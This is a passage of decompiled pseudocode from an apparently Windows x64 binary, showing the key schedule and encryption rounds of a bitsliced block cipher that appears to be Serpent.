0x9E3779A1, 11);\n  v915[22] = v92;\n  v95 = __ROL4__(v94 ^ v87 ^ v76 ^ v85 ^ 0x9E3779A0, 11);\n  v96 = __ROL4__(v95 ^ v77 ^ v86 ^ v88 ^ 0x9E3779A3, 11);\n  v915[23] = v93;\n  v97 = __ROL4__(v96 ^ v94 ^ v87 ^ v78 ^ 0x9E3779A2, 11);\n  v98 = ~v97 ^ v96;\n  v99 = v98 ^ (v94 ^ v95) & (v95 ^ v97);\n  v100 = v95 ^ v97 | v98;\n  v101 = v94 ^ v95 ^ v100;\n  v102 = ~(v99 ^ v95 ^ v100);\n  v103 = ~((v94 ^ v95 ^ v99 & ~v97 | v102) ^ v101);\n  v915[24] = v99;\n  v915[25] = v94 ^ v95 ^ v99 & ~v97;\n  v104 = __ROL4__(v95 ^ v97 ^ v873 ^ 0x9E3779A5, 11);\n  v915[26] = v102 ^ (v94 ^ v95) & v915[25];\n  v888 = __ROL4__(v104 ^ v96 ^ v94 ^ v86 ^ 0x9E3779A4, 11);\n  v105 = __ROL4__(v888 ^ v87 ^ v95 ^ v97 ^ 0x9E3779A7, 11);\n  v106 = __ROL4__(v105 ^ v104 ^ v96 ^ v88 ^ 0x9E3779A6, 11);\n  v107 = v104 ^ v95;\n  v108 = v104;\n  v874 = v104;\n  v109 = __ROL4__(v888 ^ v106 ^ v97 ^ v94 ^ 0x9E377999, 11);\n  v880 = __ROL4__(v109 ^ v105 ^ v107 ^ 0x9E377998, 11);\n  v915[27] = v103;\n  v885 = __ROL4__(v880 ^ v96 ^ v888 ^ v106 ^ 0x9E37799B, 11);\n  v110 = v109;\n  v877 = v109;\n  v111 = v109 ^ v885;\n  v866 = __ROL4__(v109 ^ v885 ^ v105 ^ v97 ^ 0x9E37799A, 11);\n  v112 = v109 | v866;\n  v113 = v112 & (v880 ^ v866) ^ (v110 & v880 | v111);\n  v114 = ~v106 ^ v105;\n  v115 = v108 ^ ~v106;\n  v116 = v114 ^ v115 & (v888 ^ v106);\n  v117 = v115 ^ v888 ^ v106;\n  v118 = v110 & v880 ^ v112;\n  v119 = v885 ^ v880 ^ v866 ^ (v118 | v113 ^ v110 & v880);\n  v120 = v117 & v114;\n  v121 = v116 & ~v888;\n  v915[28] = v116;\n  v915[29] = (v115 ^ v121) & (~v888 ^ v120) ^ v121 ^ (v116 | v117);\n  v915[30] = v120 ^ v888 ^ (v121 | v115);\n  v915[31] = v115 ^ v121;\n  v915[32] = v118 ^ v119 & ~v113;\n  v915[33] = v119;\n  v122 = __ROL4__(v880 ^ v866 ^ v106 ^ v874 ^ 0x9E37799D, 11);\n  v123 = __ROL4__(v122 ^ v888 ^ v111 ^ 0x9E37799C, 11);\n  v124 = __ROL4__(v123 ^ v105 ^ v880 ^ v866 ^ 0x9E37799F, 11);\n  v915[34] = v113;\n  v125 = __ROL4__(v122 ^ v124 ^ v885 ^ v106 ^ 0x9E37799E, 11);\n  v915[35] = v885 ^ v880 ^ v866 ^ v111 & v118;\n  v126 = v125 ^ v122 & v124;\n  v127 = v123 ^ (v122 | v125);\n  v915[36] = v126 ^ v123 ^ v124;\n  v128 = v126 ^ (v127 | v122 ^ v915[36]);\n  v129 = v122 ^ v915[36] ^ v127 & v126;\n  v915[37] = v128;\n  v915[38] = v128 ^ v129 ^ v127;\n  v130 = __ROL4__(v123 ^ v125 ^ v866 ^ v877 ^ 0x9E377991, 11);\n  v131 = __ROL4__(v130 ^ v880 ^ v122 ^ v124 ^ 0x9E377990, 11);\n  v132 = __ROL4__(v131 ^ v885 ^ v123 ^ v125 ^ 0x9E377993, 11);\n  v915[39] = ~v129;\n  v133 = __ROL4__(v132 ^ v130 ^ v124 ^ v866 ^ 0x9E377992, 11);\n  v134 = ~v130 & v131;\n  v135 = v134 | v133;\n  v136 = ~(v132 ^ v134);\n  v137 = v136 ^ v133;\n  v138 = v131 ^ v135;\n  v139 = ~v130 ^ v135;\n  v140 = v138 | ~v130;\n  v141 = v136 ^ v133 ^ v138;\n  v142 = v140 & (v139 | v136);\n  v143 = v141 ^ v139;\n  v915[40] = v142;\n  v915[41] = v140 ^ v142 & v143;\n  v915[42] = v137;\n  v144 = __ROL4__(v133 ^ v131 ^ v125 ^ v122 ^ 0x9E377995, 11);\n  v145 = __ROL4__(v144 ^ v132 ^ v130 ^ v123 ^ 0x9E377994, 11);\n  v146 = __ROL4__(v145 ^ v133 ^ v131 ^ v124 ^ 0x9E377997, 11);\n  v147 = __ROL4__(v146 ^ v144 ^ v132 ^ v125 ^ 0x9E377996, 11);\n  v915[43] = v143 ^ v142 & v141;\n  v148 = v144 ^ v147;\n  v149 = v144 ^ v145 & (v144 ^ v147);\n  v150 = v145 ^ v146 ^ (v144 | v147);\n  v151 = v144 ^ v147 ^ v145 ^ v146;\n  v152 = v146 ^ v144 ^ v147;\n  v153 = v151 ^ (v146 | v149);\n  v154 = v149 | ~v151;\n  v155 = v152 ^ v149;\n  v156 = v154 ^ (v150 | v152);\n  v915[44] = v156 ^ v155;\n  v915[45] = v156;\n  v915[46] = v153;\n  v157 = __ROL4__(v147 ^ v145 ^ v133 ^ v130 ^ 0x9E377989, 11);\n  v158 = __ROL4__(v157 ^ v146 ^ v131 ^ v144 ^ 0x9E377988, 11);\n  v159 = __ROL4__(v158 ^ v147 ^ v145 ^ v132 ^ 0x9E37798B, 11);\n  v915[47] = v150;\n  v160 = __ROL4__(v159 ^ v157 ^ v146 ^ v133 ^ 0x9E37798A, 11);\n  v161 = v160 ^ (v158 | v159);\n  v162 = v159 ^ v161;\n  v867 = v160;\n  v163 = v158 ^ v161;\n  v164 = v161 ^ v157 & (v160 | v158 ^ v159);\n  v165 = v159 ^ v161 ^ (v157 | v158 ^ v161);\n  v166 = v158 ^ v161 ^ v157 ^ (v158 | v161);\n  v915[48] = v163 ^ (v165 | ~(v166 ^ v162));\n  v915[49] = v164;\n  v915[50] = v163 ^ v165 & v166;\n  v167 = __ROL4__(v158 ^ v160 ^ v148 ^ 0x9E37798D, 11);\n  v915[51] = v162 ^ (v157 | v158 ^ v160 ^ (v158 | v159));\n  v168 = __ROL4__(v167 ^ v159 ^ v157 ^ v145 ^ 0x9E37798C, 11);\n  v169 = __ROL4__(v168 ^ v146 ^ v158 ^ v160 ^ 0x9E37798F, 11);\n  v170 = __ROL4__(v169 ^ v167 ^ v159 ^ v147 ^ 0x9E37798E, 11);\n  v171 = v167 ^ v170;\n  v172 = ~v169 ^ v167 & v170;\n  v173 = v168 ^ v172 ^ v167 ^ v170 ^ (v170 | ~v169);\n  v915[52] = v173 ^ (v172 | v167 ^ v170 | v168 ^ v172);\n  v915[53] = v168 ^ v172;\n  v915[54] = v915[52] ^ (v167 ^ v170 | v168 ^ v172) ^ v170 ^ v172;\n  v174 = __ROL4__(v168 ^ v170 ^ v867 ^ v157 ^ 0x9E377981, 11);\n  v915[55] = v915[54] & v173 ^ v169 ^ v167 & v170;\n  v175 = __ROL4__(v174 ^ v169 ^ v158 ^ v167 ^ 0x9E377980, 11);\n  v176 = __ROL4__(v175 ^ v159 ^ v168 ^ v170 ^ 0x9E377983, 11);\n  v868 = __ROL4__(v176 ^ v174 ^ v169 ^ v867 ^ 0x9E377982, 11);\n  v177 = ~v868 ^ v176 ^ (v174 ^ v175) & (v175 ^ v868);\n  v178 = v175 ^ v868 | ~v868 ^ v176;\n  v179 = ~(v177 ^ v175 ^ v178);\n  v915[56] = v177;\n  v915[57] = v174 ^ v175 ^ v177 & ~v868;\n  v915[58] = v179 ^ (v174 ^ v175) & v915[57];\n  v180 = __ROL4__(v175 ^ v868 ^ v171 ^ 0x9E377985, 11);\n  v915[59] = ~((v915[57] | v179) ^ v174 ^ v175 ^ v178);\n  v875 = __ROL4__(v180 ^ v176 ^ v174 ^ v168 ^ 0x9E377984, 11);\n  v181 = __ROL4__(v875 ^ v169 ^ v175 ^ v868 ^ 0x9E377987, 11);\n  v182 = __ROL4__(v181 ^ v180 ^ v176 ^ v170 ^ 0x9E377986, 11);\n  v183 = __ROL4__(v875 ^ v182 ^ v868 ^ v174 ^ 0x9E3779F9, 11);\n  v881 = v180;\n  v184 = __ROL4__(v183 ^ v181 ^ v180 ^ v175 ^ 0x9E3779F8, 11);\n  v886 = __ROL4__(v184 ^ v176 ^ v875 ^ v182 ^ 0x9E3779FB, 11);\n  v878 = v183;\n  v185 = v183 ^ v886;\n  v869 = __ROL4__(v183 ^ v886 ^ v181 ^ v868 ^ 0x9E3779FA, 11);\n  v889 = v184;\n  v186 = v184 ^ v869;\n  v187 = (v183 | v869) & (v184 ^ v869) ^ (v183 & v184 | v183 ^ v886);\n  v188 = ~v182 ^ v181;\n  v189 = v180 ^ ~v182;\n  v883 = v188 ^ v189 & (v875 ^ v182);\n  v190 = v189 ^ v875 ^ v182;\n  v191 = v886 ^ v184 ^ v869;\n  v192 = v183 & v184 ^ (v183 | v869);\n  v193 = v191 ^ (v192 | v187 ^ v183 & v184);\n  v194 = v192 ^ v193 & ~v187;\n  v195 = v185 & v192;\n  v196 = v190 & v188;\n  v197 = v883 & ~v875;\n  v915[60] = v883;\n  v915[61] = (v189 ^ v197) & (~v875 ^ v196) ^ v197 ^ (v883 | v190);\n  v915[62] = v196 ^ v875 ^ (v197 | v189);\n  v915[63] = v189 ^ v197;\n  v915[64] = v194;\n  v915[65] = v193;\n  v915[66] = v187;\n  v198 = __ROL4__(v186 ^ v182 ^ v881 ^ 0x9E3779FD, 11);\n  v199 = __ROL4__(v198 ^ v875 ^ v185 ^ 0x9E3779FC, 11);\n  v200 = __ROL4__(v199 ^ v181 ^ v186 ^ 0x9E3779FF, 11);\n  v915[67] = v191 ^ v195;\n  v201 = __ROL4__(v198 ^ v200 ^ v886 ^ v182 ^ 0x9E3779FE, 11);\n  v202 = v201 ^ v198 & v200;\n  v203 = v199 ^ (v198 | v201);\n  v915[68] = v202 ^ v199 ^ v200;\n  v204 = v202 ^ (v203 | v198 ^ v915[68]);\n  v205 = v198 ^ v915[68] ^ v203 & v202;\n  v915[69] = v204;\n  v915[70] = v204 ^ v205 ^ v203;\n  v915[71] = ~v205;\n  v206 = __ROL4__(v199 ^ v201 ^ v869 ^ v878 ^ 0x9E3779F1, 11);\n  v207 = __ROL4__(v206 ^ v889 ^ v198 ^ v200 ^ 0x9E3779F0, 11);\n  v208 = __ROL4__(v207 ^ v886 ^ v199 ^ v201 ^ 0x9E3779F3, 11);\n  v209 = __ROL4__(v208 ^ v206 ^ v200 ^ v869 ^ 0x9E3779F2, 11);\n  v210 = ~v206 & v207;\n  v211 = v210 | v209;\n  v212 = ~(v208 ^ v210);\n  v213 = v212 ^ v209;\n  v214 = v207 ^ v211;\n  v215 = ~v206 ^ v211;\n  v216 = v214 | ~v206;\n  v217 = v212 ^ v209 ^ v214;\n  v218 = v216 & (v215 | v212);\n  v219 = v217 ^ v215;\n  v915[72] = v218;\n  v915[73] = v216 ^ v218 & v219;\n  v915[74] = v213;\n  v915[75] = v219 ^ v218 & v217;\n  v220 = __ROL4__(v209 ^ v207 ^ v201 ^ v198 ^ 0x9E3779F5, 11);\n  v221 = __ROL4__(v220 ^ v208 ^ v206 ^ v199 ^ 0x9E3779F4, 11);\n  v222 = __ROL4__(v221 ^ v209 ^ v207 ^ v200 ^ 0x9E3779F7, 11);\n  v223 = __ROL4__(v222 ^ v220 ^ v208 ^ v201 ^ 0x9E3779F6, 11);\n  v224 = v220 ^ v223;\n  v225 = v220 ^ v221 & (v220 ^ v223);\n  v226 = v220 ^ v223 ^ v221 ^ v222;\n  v227 = v222 ^ v220 ^ v223;\n  v228 = v226 ^ (v222 | v225);\n  v229 = v225 | ~v226;\n  v230 = v227 ^ v225;\n  v231 = v229 ^ (v221 ^ v222 ^ (v220 | v223) | v227);\n  v915[76] = v231 ^ v230;\n  v915[77] = v231;\n  v915[78] = v228;\n  v915[79] = v221 ^ v222 ^ (v220 | v223);\n  v232 = __ROL4__(v223 ^ v221 ^ v209 ^ v206 ^ 0x9E3779E9, 11);\n  v233 = __ROL4__(v232 ^ v222 ^ v207 ^ v220 ^ 0x9E3779E8, 11);\n  v234 = __ROL4__(v233 ^ v223 ^ v221 ^ v208 ^ 0x9E3779EB, 11);\n  v235 = __ROL4__(v234 ^ v232 ^ v222 ^ v209 ^ 0x9E3779EA, 11);\n  v236 = v235 ^ (v233 | v234);\n  v237 = v234 ^ v236;\n  v238 = v233 ^ v236;\n  v239 = v236 ^ v232 & (v235 | v233 ^ v234);\n  v240 = v234 ^ v236 ^ (v232 | v233 ^ v236);\n  v241 = v233 ^ v236 ^ v232 ^ (v233 | v236);\n  v915[80] = v238 ^ (v240 | ~(v241 ^ v237));\n  v915[81] = v239;\n  v242 = __ROL4__(v233 ^ v235 ^ v224 ^ 0x9E3779ED, 11);\n  v243 = __ROL4__(v242 ^ v234 ^ v232 ^ v221 ^ 0x9E3779EC, 11);\n  v915[82] = v238 ^ v240 & v241;\n  v244 = __ROL4__(v243 ^ v222 ^ v233 ^ v235 ^ 0x9E3779EF, 11);\n  v245 = __ROL4__(v244 ^ v242 ^ v234 ^ v223 ^ 0x9E3779EE, 11);\n  v915[83] = v237 ^ (v232 | v233 ^ v235 ^ (v233 | v234));\n  v246 = v242 ^ v245;\n  v247 = ~v244 ^ v242 & v245;\n  v248 = v243 ^ v247 ^ v242 ^ v245 ^ (v245 | ~v244);\n  v249 = v248 ^ (v247 | v242 ^ v245 | v243 ^ v247);\n  v250 = v249 ^ (v242 ^ v245 | v243 ^ v247) ^ v245 ^ v247;\n  v251 = v250 & v248 ^ v244 ^ v242 & v245;\n  v915[84] = v249;\n  v915[85] = v243 ^ ~v244 ^ v242 & v245;\n  v252 = __ROL4__(v243 ^ v245 ^ v235 ^ v232 ^ 0x9E3779E1, 11);\n  v253 = __ROL4__(v252 ^ v244 ^ v233 ^ v242 ^ 0x9E3779E0, 11);\n  v915[86] = v250;\n  v254 = __ROL4__(v253 ^ v234 ^ v243 ^ v245 ^ 0x9E3779E3, 11);\n  v255 = __ROL4__(v254 ^ v252 ^ v244 ^ v235 ^ 0x9E3779E2, 11);\n  v915[87] = v251;\n  v256 = ~v255 ^ v254;\n  v257 = v256 ^ (v252 ^ v253) & (v253 ^ v255);\n  v258 = v253 ^ v255 | v256;\n  v259 = v252 ^ v253 ^ v258;\n  v260 = ~(v257 ^ v253 ^ v258);\n  v915[88] = v257;\n  v915[89] = v252 ^ v253 ^ v257 & ~v255;\n  v261 = __ROL4__(v253 ^ v255 ^ v246 ^ 0x9E3779E5, 11);\n  v915[90] = v260 ^ (v252 ^ v253) & v915[89];\n  v262 = __ROL4__(v261 ^ v254 ^ v252 ^ v243 ^ 0x9E3779E4, 11);\n  v263 = __ROL4__(v262 ^ v244 ^ v253 ^ v255 ^ 0x9E3779E7, 11);\n  v915[91] = ~((v915[89] | v260) ^ v259);\n  v264 = __ROL4__(v263 ^ v261 ^ v254 ^ v245 ^ 0x9E3779E6, 11);\n  v265 = v262 ^ v264;\n  v266 = ~v264;\n  v267 = v266 ^ v263;\n  v268 = v261 ^ v266;\n  v269 = v267 ^ v268 & v265;\n  v270 = ~v262;\n  v271 = (v268 ^ v265) & v267;\n  v272 = v271 ^ v262;\n  v273 = v270 ^ v271;\n  v274 = v269 & v270;\n  v915[92] = v269;\n  v915[93] = (v268 ^ v274) & v273 ^ v274 ^ (v269 | v268 ^ v265);\n  v915[94] = v272 ^ (v274 | v268);\n  v915[95] = v268 ^ v274;\n  v275 = __ROL4__(v265 ^ v255 ^ v252 ^ 0x9E3779D9, 11);\n  v276 = __ROL4__(v275 ^ v263 ^ v253 ^ v261 ^ 0x9E3779D8, 11);\n  v277 = __ROL4__(v276 ^ v254 ^ v265 ^ 0x9E3779DB, 11);\n  v278 = __ROL4__(v277 ^ v275 ^ v255 ^ v263 ^ 0x9E3779DA, 11);\n  v279 = v275 | v278;\n  v280 = v276 ^ v278;\n  v281 = v275 & v276;\n  v282 = v277 ^ v275;\n  v283 = v280 ^ v277;\n  v284 = v279 & v280 ^ (v281 | v282);\n  v285 = v281 ^ v279;\n  v286 = v283 ^ (v285 | v284 ^ v281);\n  v915[96] = v285 ^ v286 & ~v284;\n  v915[97] = v286;\n  v915[98] = v284;\n  v915[99] = v283 ^ v282 & v285;\n  v898 = *a6;\n  v287 = (unsigned int *)sub_14000E966((__int64)&v898, 0i64, 4ui64, (__int64)&off_140064FE8);\n  v289 = sub_140019BA1(v287, v288);\n  v290 = (unsigned int *)sub_14000E966((__int64)&v898, 4ui64, 8ui64, (__int64)&off_140065000);\n  v292 = sub_140019BA1(v290, v291);\n  v293 = (unsigned int *)sub_14000E966((__int64)&v898, 8ui64, 0xCui64, (__int64)&off_140065018);\n  v295 = sub_140019BA1(v293, v294);\n  v296 = (unsigned int *)sub_14000E966((__int64)&v898, 0xCui64, 0x10ui64, (__int64)&off_140065030);\n  v298 = sub_140019BA1(v296, v297);\n  v299 = v915[0] ^ v289;\n  v300 = v915[1] ^ v292;\n  v301 = v915[2] ^ v295;\n  v302 = v915[3] ^ v298;\n  v303 = v299 ^ v302;\n  v304 = v300 & (v299 ^ v302);\n  v305 = v301 ^ v300;\n  v306 = v299 ^ v304;\n  v307 = v305 ^ (v299 | v302);\n  v308 = v303 ^ v305;\n  v309 = v301 ^ v303;\n  v310 = v308 ^ (v306 | v301);\n  v311 = v306 | ~v308;\n  v312 = v309 ^ v306;\n  v313 = v311 ^ (v307 | v309);\n  v314 = __ROL4__(v313 ^ v312, 13);\n  v315 = __ROL4__(v310, 3);\n  v316 = __ROL4__(v314 ^ v315 ^ v313, 1);\n  v317 = __ROL4__((8 * v314) ^ v315 ^ v307, 7);\n  v318 = __ROL4__(v317 ^ v316 ^ v314, 5);\n  v319 = __ROL4__(v317 ^ v315 ^ (v316 << 7), 22);\n  v320 = v915[5] ^ v316;\n  v321 = v915[7] ^ v317;\n  v322 = ~(v915[4] ^ v318);\n  v323 = ~(v322 & v320 ^ v915[6] ^ v319);\n  v324 = v321 | v322 & v320;\n  v325 = v323 ^ v321;\n  v326 = v324 ^ v320;\n  v327 = v322 ^ v324;\n  v328 = v326 | v322;\n  v329 = v325 ^ v326;\n  v330 = v328 & (v327 | v323);\n  v331 = v329 ^ v327;\n  v332 = __ROL4__(v325, 3);\n  v333 = v331 ^ v332 ^ v330 & v329;\n  v334 = v330 & v331;\n  v335 = __ROL4__(v330, 13);\n  v336 = __ROL4__(v335 ^ v334 ^ v332 ^ v328, 1);\n  v337 = __ROL4__((8 * v335) ^ v333, 7);\n  v338 = __ROL4__((v336 << 7) ^ v337 ^ v332, 22);\n  v339 = v915[8] ^ __ROL4__(v337 ^ v336 ^ v335, 5);\n  v340 = v915[9] ^ v336;\n  v341 = v915[10] ^ v338;\n  v342 = v915[11] ^ v337;\n  v343 = v342 ^ v339 & v341;\n  v344 = v343 ^ v340 ^ v341;\n  v345 = v340 ^ (v339 | v342);\n  v346 = v344 ^ v339;\n  v347 = v343 ^ (v345 | v346);\n  v348 = v346 ^ v345 & v343;\n  v349 = __ROL4__(v344, 13);\n  v350 = __ROL4__(v347 ^ v348 ^ v345, 3);\n  v351 = __ROL4__(v350 ^ v349 ^ v347, 1);\n  v352 = __ROL4__(~(v350 ^ v348 ^ (8 * v349)), 7);\n  v353 = __ROL4__(v352 ^ v350 ^ (v351 << 7), 22);\n  v354 = v915[12] ^ __ROL4__(v352 ^ v351 ^ v349, 5);\n  v355 = v915[13] ^ v351;\n  v356 = v915[14] ^ v353;\n  v357 = v915[15] ^ v352;\n  v358 = v357 | v354;\n  v359 = v355 ^ v357;\n  v360 = v354 & v355;\n  v361 = v356 ^ v354;\n  v362 = v359 ^ v356;\n  v363 = v358 & v359 ^ (v360 | v361);\n  v364 = v360 ^ v358;\n  v365 = v362 ^ (v364 | v363 ^ v360);\n  v366 = __ROL4__(v364 ^ v365 & ~v363, 13);\n  v367 = __ROL4__(v363, 3);\n  v368 = __ROL4__(v366 ^ v367 ^ v365, 1);\n  v369 = __ROL4__((8 * v366) ^ v367 ^ v362 ^ v364 & v361, 7);\n  v370 = __ROL4__(v369 ^ v368 ^ v366, 5);\n  v371 = __ROL4__(v369 ^ v367 ^ (v368 << 7), 22);\n  v372 = v915[17] ^ v368;\n  v373 = v915[19] ^ v369;\n  v374 = v372 ^ v373;\n  v375 = ~v373;\n  v376 = v375 ^ v915[18] ^ v371;\n  v377 = v375 ^ v915[16] ^ v370;\n  v378 = v376 ^ v374 & v377;\n  v379 = v377 ^ v374;\n  v380 = ~v372;\n  v381 = v379 & v376;\n  v382 = v381 ^ v372;\n  v383 = v380 ^ v381;\n  v384 = v378 & v380;\n  v385 = v377 ^ v384;\n  v386 = v378 | v379;\n  v387 = __ROL4__(v378, 13);\n  v388 = __ROL4__(v382 ^ (v384 | v377), 3);\n  v389 = __ROL4__(v388 ^ v385 & v383 ^ v387 ^ v384 ^ v386, 1);\n  v390 = __ROL4__(v388 ^ v385 ^ (8 * v387), 7);\n  v391 = __ROL4__(v389 ^ v390 ^ v387, 5);\n  v392 = __ROL4__((v389 << 7) ^ v390 ^ v388, 22);\n  v393 = v915[21] ^ v389;\n  v394 = v915[23] ^ v390;\n  v395 = v393 ^ v915[20] ^ v391;\n  v396 = v394 ^ v393;\n  v397 = ~v394;\n  v398 = v397 ^ v915[22] ^ v392;\n  v399 = v398 ^ v396 & v395;\n  v400 = v396 | v398;\n  v401 = v395 ^ v399 & v397;\n  v402 = ~(v399 ^ v400 ^ v393);\n  v403 = v402 ^ v395 & v401;\n  v404 = v401 | v402;\n  v405 = __ROL4__(v399, 13);\n  v406 = __ROL4__(v403, 3);\n  v407 = __ROL4__(v406 ^ v405 ^ v401, 1);\n  v408 = __ROL4__(~(v406 ^ v404 ^ (8 * v405) ^ v395 ^ v400), 7);\n  v409 = v915[24] ^ __ROL4__(v408 ^ v407 ^ v405, 5);\n  v410 = v915[26] ^ __ROL4__(v408 ^ v406 ^ (v407 << 7), 22);\n  v411 = v915[27] ^ v408;\n  v412 = v411 & v409;\n  v413 = v411 ^ v409;\n  v414 = ~v410 ^ v412;\n  v415 = v414 ^ v915[25] ^ v407;\n  v416 = v413 ^ (v411 | ~v410);\n  v417 = v415 | v413;\n  v418 = v415 ^ v416;\n  v419 = v418 ^ (v414 | v417);\n  v420 = v419 ^ v417 ^ v411 ^ v414;\n  v421 = v420 & v418;\n  v422 = __ROL4__(v419, 13);\n  v423 = __ROL4__(v420, 3);\n  v424 = __ROL4__(v423 ^ v422 ^ v415, 1);\n  v425 = __ROL4__((8 * v422) ^ v410 ^ v421 ^ v423 ^ v412, 7);\n  v426 = __ROL4__(v425 ^ v423 ^ (v424 << 7), 22);\n  v427 = v915[28] ^ __ROL4__(v425 ^ v424 ^ v422, 5);\n  v428 = v915[29] ^ v424;\n  v429 = v915[30] ^ v426;\n  v430 = v915[31] ^ v425;\n  v431 = v430 ^ (v428 | v429);\n  v432 = v429 ^ v431;\n  v433 = v428 ^ v431;\n  v434 = v431 ^ v427 & (v430 | v428 ^ v429);\n  v435 = v427 ^ (v428 | v431);\n  v436 = v432 ^ (v433 | v427);\n  v437 = v433 ^ v435;\n  v438 = __ROL4__(v433 ^ (v436 | ~(v437 ^ v432)), 13);\n  v439 = __ROL4__(v433 ^ v436 & v437, 3);\n  v440 = __ROL4__(v438 ^ v439 ^ v434, 1);\n  v441 = __ROL4__((8 * v438) ^ v439 ^ v436, 7);\n  v442 = __ROL4__(v441 ^ v439 ^ (v440 << 7), 22);\n  v443 = v915[32] ^ __ROL4__(v441 ^ v440 ^ v438, 5);\n  v444 = v915[33] ^ v440;\n  v445 = v915[34] ^ v442;\n  v446 = v915[35] ^ v441;\n  v447 = v446 ^ v443;\n  v448 = v444 & (v446 ^ v443);\n  v449 = v445 ^ v444;\n  v450 = v443 ^ v448;\n  v451 = v449 ^ (v443 | v446);\n  v452 = v447 ^ v449;\n  v453 = v445 ^ v447;\n  v454 = (v450 | ~v452) ^ (v453 | v451);\n  v455 = __ROL4__(v454 ^ v450 ^ v453, 13);\n  v456 = __ROL4__(v452 ^ (v450 | v445), 3);\n  v457 = __ROL4__(v455 ^ v456 ^ v454, 1);\n  v458 = __ROL4__((8 * v455) ^ v456 ^ v451, 7);\n  v459 = __ROL4__(v458 ^ v457 ^ v455, 5);\n  v460 = __ROL4__(v458 ^ v456 ^ (v457 << 7), 22);\n  v461 = v915[37] ^ v457;\n  v462 = v915[39] ^ v458;\n  v463 = ~(v915[36] ^ v459);\n  v464 = ~(v463 & v461 ^ v915[38] ^ v460);\n  v465 = v462 | v463 & v461;\n  v466 = v464 ^ v462;\n  v467 = v465 ^ v461;\n  v468 = v463 ^ v465;\n  v469 = v467 | v463;\n  v470 = v466 ^ v467;\n  v471 = v469 & (v468 | v464);\n  v472 = v470 ^ v468;\n  v473 = __ROL4__(v466, 3);\n  v474 = v472 ^ v473 ^ v471 & v470;\n  v475 = v471 & v472;\n  v476 = __ROL4__(v471, 13);\n  v477 = __ROL4__(v476 ^ v475 ^ v473 ^ v469, 1);\n  v478 = __ROL4__((8 * v476) ^ v474, 7);\n  v479 = __ROL4__((v477 << 7) ^ v478 ^ v473, 22);\n  v480 = v915[40] ^ __ROL4__(v478 ^ v477 ^ v476, 5);\n  v481 = v915[41] ^ v477;\n  v482 = v915[42] ^ v479;\n  v483 = v915[43] ^ v478;\n  v484 = v483 ^ v480 & v482;\n  v485 = v484 ^ v481 ^ v482;\n  v486 = v481 ^ (v480 | v483);\n  v487 = v485 ^ v480;\n  v488 = v484 ^ (v486 | v487);\n  v489 = v487 ^ v486 & v484;\n  v490 = __ROL4__(v485, 13);\n  v491 = __ROL4__(v488 ^ v489 ^ v486, 3);\n  v492 = __ROL4__(v491 ^ v490 ^ v488, 1);\n  v493 = __ROL4__(~(v491 ^ v489 ^ (8 * v490)), 7);\n  v494 = __ROL4__(v493 ^ v491 ^ (v492 << 7), 22);\n  v495 = v915[44] ^ __ROL4__(v493 ^ v492 ^ v490, 5);\n  v496 = v915[45] ^ v492;\n  v497 = v915[46] ^ v494;\n  v498 = v915[47] ^ v493;\n  v499 = v498 | v495;\n  v500 = v496 ^ v498;\n  v501 = v495 & v496;\n  v502 = v497 ^ v495;\n  v503 = v500 ^ v497;\n  v504 = v499 & v500 ^ (v501 | v502);\n  v505 = v501 ^ v499;\n  v506 = v503 ^ (v505 | v504 ^ v501);\n  v507 = __ROL4__(v505 ^ v506 & ~v504, 13);\n  v508 = __ROL4__(v504, 3);\n  v509 = __ROL4__(v507 ^ v508 ^ v506, 1);\n  v510 = __ROL4__((8 * v507) ^ v508 ^ v503 ^ v505 & v502, 7);\n  v915[129] = __ROL4__(v510 ^ v509 ^ v507, 5);\n  v915[128] = v509;\n  v915[127] = __ROL4__(v510 ^ v508 ^ (v509 << 7), 22);\n  v915[126] = v510;\n  v511 = v915[49] ^ v509;\n  v512 = v915[51] ^ v510;\n  v513 = v511 ^ v512;\n  v514 = ~v512;\n  v515 = v915[127] ^ v514 ^ v915[50];\n  v516 = v915[129] ^ v915[48] ^ v514;\n  v517 = v515 ^ v513 & v516;\n  v518 = v516 ^ v513;\n  v519 = ~v511;\n  v520 = v518 & v515;\n  v521 = v520 ^ v511;\n  v522 = v519 ^ v520;\n  v523 = v517 & v519;\n  v524 = v516 ^ v523;\n  v525 = v517 | v518;\n  v526 = __ROL4__(v517, 13);\n  v527 = __ROL4__(v521 ^ (v523 | v516), 3);\n  v528 = __ROL4__(v527 ^ v524 & v522 ^ v526 ^ v523 ^ v525, 1);\n  v529 = __ROL4__(v527 ^ v524 ^ (8 * v526), 7);\n  v530 = __ROL4__(v528 ^ v529 ^ v526, 5);\n  v531 = __ROL4__((v528 << 7) ^ v529 ^ v527, 22);\n  v532 = v915[53] ^ v528;\n  v533 = v915[55] ^ v529;\n  v534 = v532 ^ v915[52] ^ v530;\n  v535 = v533 ^ v532;\n  v536 = ~v533;\n  v537 = v536 ^ v915[54] ^ v531;\n  v538 = v537 ^ v535 & v534;\n  v539 = v535 | v537;\n  v540 = v534 ^ v538 & v536;\n  v541 = ~(v538 ^ v539 ^ v532);\n  v542 = v541 ^ v534 & v540;\n  v543 = v540 | v541;\n  v544 = __ROL4__(v538, 13);\n  v545 = __ROL4__(v542, 3);\n  v546 = __ROL4__(v545 ^ v544 ^ v540, 1);\n  v547 = __ROL4__(~(v545 ^ v543 ^ (8 * v544) ^ v534 ^ v539), 7);\n  v548 = v915[56] ^ __ROL4__(v547 ^ v546 ^ v544, 5);\n  v549 = v915[58] ^ __ROL4__(v547 ^ v545 ^ (v546 << 7), 22);\n  v550 = v915[59] ^ v547;\n  v551 = v550 & v548;\n  v552 = v550 ^ v548;\n  v553 = ~v549 ^ v551;\n  v554 = v553 ^ v915[57] ^ v546;\n  v555 = v552 ^ (v550 | ~v549);\n  v556 = v554 | v552;\n  v557 = v554 ^ v555;\n  v558 = v557 ^ (v553 | v556);\n  v559 = v558 ^ v556 ^ v550 ^ v553;\n  v560 = v559 & v557;\n  v561 = __ROL4__(v558, 13);\n  v562 = __ROL4__(v559, 3);\n  v563 = __ROL4__(v562 ^ v561 ^ v554, 1);\n  v564 = __ROL4__((8 * v561) ^ v549 ^ v560 ^ v562 ^ v551, 7);\n  v565 = __ROL4__(v564 ^ v562 ^ (v563 << 7), 22);\n  v566 = v915[60] ^ __ROL4__(v564 ^ v563 ^ v561, 5);\n  v567 = v915[61] ^ v563;\n  v568 = v915[62] ^ v565;\n  v569 = v915[63] ^ v564;\n  v570 = v569 ^ (v567 | v568);\n  v571 = v568 ^ v570;\n  v572 = v567 ^ v570;\n  v573 = v570 ^ v566 & (v569 | v567 ^ v568);\n  v574 = v566 ^ (v567 | v570);\n  v575 = v571 ^ (v572 | v566);\n  v576 